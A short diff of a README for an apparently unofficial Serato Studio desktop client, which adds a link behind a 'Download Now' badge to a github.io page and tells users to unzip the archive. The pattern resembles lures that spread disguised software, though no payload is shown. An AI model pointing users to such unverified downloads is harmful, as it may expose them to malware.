@@ -6,7 +6,7 @@ This unofficial Serato Studio desktop client brings the powerful beat-making and
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://serato-studio-desktop-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
